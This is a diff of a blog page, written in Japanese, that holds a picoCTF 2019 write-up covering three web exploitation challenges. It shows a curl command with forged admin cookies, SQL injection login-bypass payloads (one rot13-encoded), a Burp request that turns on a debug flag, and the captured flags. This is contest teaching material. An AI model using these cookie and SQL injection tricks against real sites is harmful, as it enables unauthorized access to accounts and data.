@@ -155,43 +155,43 @@
 </div>
     <div class="post-content">
       <p>URL: <a href="https://2019game.picoctf.com/"><a href="https://2019game.picoctf.com/">https://2019game.picoctf.com/</a></a>
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 2週間、お疲れ様です。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<p><br /><br />
 最終結果は、こんな感じ。</p>
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted -->
+<img src="https://captureamerica.github.io/writeups/img/pico2019_Score.png" alt="pico2019_Score.png">
+<p><br />
 イベント終了時点で、ユーザは4万人弱でした。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<img src="https://captureamerica.github.io/writeups/img/pico2019_Users.png" alt="pico2019_Users.png">
+<img src="https://captureamerica.github.io/writeups/img/pico2019_Rank.png" alt="pico2019_Rank.png">
 <p>PwnとWeb系があんまりできてないけど、スコアも切りのいい20000に行ったし、Globalで目標の300位以内 (283位) にも入れたのでかなり満足です。</p>
 <p>去年出た問題に似てるものも結構あったので、picoCTF 2018をそれなりにやった人は結構アドバンテージがあったと思います。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<p><br /><br />
 Web Exploitation の Writeupです。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br /></p>
 <h1 id="web-exploitation-opentoadmins-200-points">[Web Exploitation]: Open-to-admins (200 points)</h1>
 <hr>
 <h2 id="challenge">Challenge</h2>
 <blockquote>
 <p>This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. <a href="https://2019shell1.picoctf.com/problem/32249/">https://2019shell1.picoctf.com/problem/32249/</a> (link) or <a href="http://2019shell1.picoctf.com:32249">http://2019shell1.picoctf.com:32249</a>
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
-Hints : Can cookies help you to get the flag?<!-- raw HTML omitted --></p>
+<br /><br />
+Hints : Can cookies help you to get the flag?<br /></p>
 </blockquote>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution">Solution</h2>
 <pre><code>curl -k -H 'Cookie: admin=True; time=1400'  https://2019shell1.picoctf.com/problem/32249/flag
 </code></pre><p>Flag: <code>picoCTF{0p3n_t0_adm1n5_cc661e91}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="web-exploitation-irishnamerepo-2-350-points">[Web Exploitation]: Irish-Name-Repo 2 (350 points)</h1>
 <hr>
 <h2 id="challenge1">Challenge</h2>
 <blockquote>
 <p>There is a website running at <a href="https://2019shell1.picoctf.com/problem/60775/">https://2019shell1.picoctf.com/problem/60775/</a> (link). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or <a href="http://2019shell1.picoctf.com:60775">http://2019shell1.picoctf.com:60775</a>
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hints : The password is being filtered.</p>
 </blockquote>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution1">Solution</h2>
 <p>picoCTF 2018のVaultと同じ問題です。</p>
 <p>デバッグを見ようとして、以下を入れたら、Flag取れちゃった。</p>
@@ -201,17 +201,17 @@ Hints : The password is being filtered.</p>
 password
 */ or 3=3 -- &amp;debug=1
 </code></pre><p>Flag: <code>picoCTF{m0R3_SQL_plz_015815e2}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="web-exploitation-irishnamerepo-3-400-points">[Web Exploitation]: Irish-Name-Repo 3 (400 points)</h1>
 <hr>
 <h2 id="challenge2">Challenge</h2>
 <blockquote>
 <p>There is a secure website running at <a href="https://2019shell1.picoctf.com/problem/12271/">https://2019shell1.picoctf.com/problem/12271/</a> (link) or <a href="http://2019shell1.picoctf.com:12271">http://2019shell1.picoctf.com:12271</a>. Try to see if you can login as admin!
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hints : Seems like the password is encrypted.</p>
 </blockquote>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution2">Solution</h2>
 <p>Burpでやったらdebug変数が見えたので、1に変えてみました。</p>
 <pre><code>POST /problem/12271/login.php HTTP/1.1
@@ -230,17 +230,17 @@ password=admin&amp;debug=1
 </code></pre><pre><code>password: admin
 SQL query: SELECT * FROM admin where password = 'nqzva'
 </code></pre><p>&lsquo;nqzva&rsquo; は、&lsquo;admin&rsquo; のRot13ですね。</p>
-<p><!-- raw HTML omitted -->
+<p><br />
 いつものこの子を、</p>
 <pre><code>' or 1=1 --
 </code></pre><p>Rot13して以下のようにします。</p>
 <pre><code>' be 1=1 --
 </code></pre><p>Flag: <code>picoCTF{3v3n_m0r3_SQL_ef7eac2f}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <hr>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 
     </div>
 
